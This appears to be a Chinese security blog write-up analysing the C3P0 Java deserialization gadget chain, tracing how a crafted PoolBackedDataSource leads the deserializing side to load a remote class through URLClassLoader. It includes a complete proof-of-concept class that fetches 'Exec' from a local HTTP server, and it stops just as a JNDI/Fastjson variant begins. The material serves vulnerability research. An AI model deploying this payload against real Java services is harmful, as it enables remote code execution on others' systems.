# C3P0
C3P0是一个开源的`JDBC`连接池，它实现了数据源和`JNDI`绑定，支持JDBC3规范和JDBC2的标准扩展。使用它的开源项目有Hibernate、Spring等。
  * dbcp没有自动回收空闲连接的功能
  * c3p0有自动回收空闲连接功能
**gadget**
    com.mchange.v2.naming.ReferenceableUtils#referenceToObject
     com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
     com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
**依赖**
        com.mchange
        c3p0
        0.9.5.2
先测试下ysoserial中的C3P0链
    public static void main ( final String[] args ) throws Exception {
        //PayloadRunner.run(C3P0.class, args);
        C3P0 c3P0 = new C3P0();
        Object object = c3P0.getObject("http://127.0.0.1:7777/:Exec");
        byte[] serialize = Serializer.serialize(object);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serialize);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        Object o = objectInputStream.readObject();
    }
本地开启python服务成功执行
## 流程分析
### getObject()
先调试一下调用getObject时，会通过后边的`:`作为分割，分别取出url：`127.0.0.1`和className：`Exec`
接着通过反射获取反射获取`PoolBackedDataSource`对象  
接着获取connectionPoolDataSource属性，并将通过PoolSource方法获取将刚刚获取的url和className赋值给它时  
### 序列化
getObject()调用完后，接着执行`byte[] serialize =
Serializer.serialize(object);`，将刚获取的`PoolBackedDataSource`类传入
最后调用`objOut.writeObject(obj);`，调用到了`PoolBackedDataSourceBase`的writeObject
这里需要注意一个点我们获取的是`PoolBackedDataSource`对象，而调用的`PoolBackedDataSourceBase`的writeObject，这是由于继承关系导致
#### NotSerializableException异常
跟进`PoolBackedDataSourceBase`的writeObject
①：首先会对connectionPoolDataSource进行序列化，但是会抛出异常调用catch
②：实例化了一个ReferenceIndirector类型的类，并将需要反序列化的数据传入，成功将序列化内容写入oos中
> 注：
>
> 这里开始没明白为什么①处为什么会抛异`NotSerializableException`，上网搜了一下这个主要是因为我们自己构造的C3P0类没有
>
> 实现序列化类，而②处没异常则是因为它实现了`Serializable`接口
这里跟进简单了解下：
`indirector.indirectForm( connectionPoolDataSource )`调用`indirectForm()`
    public IndirectlySerialized indirectForm( Object orig ) throws Exception
    { 
    Reference ref = ((Referenceable) orig).getReference();
    return new ReferenceSerialized( ref, name, contextName, environmentProperties );
    }
其中orig是我们传入的自定义的C3P0类，所以会调用`C3P0#getReference()`
除此外getReference()实例化的是Reference类，而跟进以后发现实现了`Serializable`接口，这也就是不抛出异常的原因所在
将值都传入ref，接着调用`ReferenceSerialized()`对参数进行实例化并retrun返回 进行序列化。
### 反序列化
210行将序列化的内容进行反序列化，之后调用`IndirectlySerialized`类的`getObject()`
跟进创建了一个`InitialContext()`上下文，并且下边出现了lookup，但contextName不可控，因此这里不存在JNDI注入
    import javax.naming.InitialContext;
    public class JNDIRMIServer {
        public static void main(String[] args)throws Exception {
            InitialContext initialContext = new InitialContext();
            initialContext.rebind("rmi://127.0.0.1:1099/remoteObj",new RemoteObjImpl());
        }
    }
`return ReferenceableUtils.referenceToObject( reference, name, nameContext,
env );`接着跟进  
先获取只在`Reference`中的数据，接着通过`URLClassLoader`远程加载类造成远程代码执行  
POC:
    package C3P0;
    import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.sql.SQLException;
    import java.sql.SQLFeatureNotSupportedException;
    import java.util.logging.Logger;
    import javax.naming.Reference;
    import javax.naming.Referenceable;
    import javax.sql.ConnectionPoolDataSource;
    import javax.sql.PooledConnection;
    public class C3P0 {
        public Object getObject(String cmd) throws NoSuchFieldException, IllegalAccessException {
            int i = cmd.lastIndexOf(":");
            String sub1 = cmd.substring(i+1);
            String sub2 = cmd.substring(0, i);
            PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
            Field connectionPoolDataSource = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
            connectionPoolDataSource.setAccessible(true);
            connectionPoolDataSource.set(poolBackedDataSourceBase,new PoolSource(sub1,sub2));
            return poolBackedDataSourceBase;
        }
        public class PoolSource implements ConnectionPoolDataSource , Referenceable {
            private String className;
            private String url;
            public PoolSource ( String className, String url ) {
                this.className = className;
                this.url = url;
            }
        public Reference getReference(){
            return new Reference("Sentiment",className,url);
        }
            @Override
            public PooledConnection getPooledConnection() throws SQLException {
                return null;
            }
            @Override
            public PooledConnection getPooledConnection(String user, String password) throws SQLException {
                return null;
            }
            @Override
            public PrintWriter getLogWriter() throws SQLException {
                return null;
            }
            @Override
            public void setLogWriter(PrintWriter out) throws SQLException {
            }
            @Override
            public void setLoginTimeout(int seconds) throws SQLException {
            }
            @Override
            public int getLoginTimeout() throws SQLException {
                return 0;
            }
            @Override
            public Logger getParentLogger() throws SQLFeatureNotSupportedException {
                return null;
            }
        }
        public static void main ( final String[] args ) throws Exception {
            C3P0 c3P0 = new C3P0();
            Object object = c3P0.getObject("http://127.0.0.1:7777/:Exec");
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            ObjectOutputStream objOut = new ObjectOutputStream(out);
            objOut.writeObject(object);
            byte[] serialize= out.toByteArray();
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serialize);
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
        }
    }
# JNDI
在上述方式中提到过JNDI注入，不过其中的参数不可控，但其实C3P0组件中通过`setJndiName()`也可触发JNDI注入
这里以Fastjson为例：
**依赖**
        com.alibaba
        fastjson